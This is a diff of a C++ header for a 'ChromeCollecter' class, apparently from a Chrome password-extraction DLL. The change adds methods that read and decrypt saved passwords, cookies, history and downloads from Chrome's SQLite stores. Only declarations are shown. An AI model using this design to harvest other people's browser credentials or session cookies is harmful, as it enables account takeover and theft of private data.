@@ -4,8 +4,9 @@
 #include <memory>
 #include "Base64.h"
 #include "cJSON.h"
+#include "Data.h"
 #include <string>
-#include <vector>
+#include <list>
 
 #include "ChromeDecrypt.h"
 #ifdef ChromePassEx_EXPORTS
@@ -23,7 +24,7 @@
 #define NONCE_LEN 12
 #define MAX_SIZE 1024
 
-template <class T>
+
 class  EXPORT_F ChromeCollecter 
 {
 public:
@@ -31,15 +32,23 @@ public:
 
 	 ~ChromeCollecter() = default;
 
-	 virtual std::vector<T> collectData() =0 ;
+	 void collectPasswords(std::list<userData>& userDataList);
+	 void collectCookies(std::list<CookieData>& cookieDataList);
+	 void collectHistory(std::list<historyData>& historyDataList);
+	 void collectDownloads(std::list<downloadsData>& downloadsDataList);
 
-protected:
 
-	virtual void collectFromPath(const std::string& chromePath) = 0;
-	virtual bool getDbPath(const std::string& chromePath)=0 ;
-	std::vector<T> m_collectedData;
+private:
+	bool prepareToGoOverSqlite(const std::string& chromePath, const std::string& infoPath);
+	void collectPasswordsFromSqlite(std::list<userData>& userDataList);
+	void collectCookiesFromSqlite(std::list<CookieData>& cookieDataList);
+	void collectHistoryFromSqlite(std::list<historyData>& historyDataList);
+	void collectDownloadsFromSqlite(std::list<downloadsData>& downloadsDataList);
+
+	bool getDbPath(const std::string& chromePath, const std::string& infoPath);
 	std::string m_chromeSqlitePath;
 	ChromeDecrypt m_decryptor;
+
 	const std::vector<std::string> m_chromeList{
 
 		"\\Google\\Chrome",
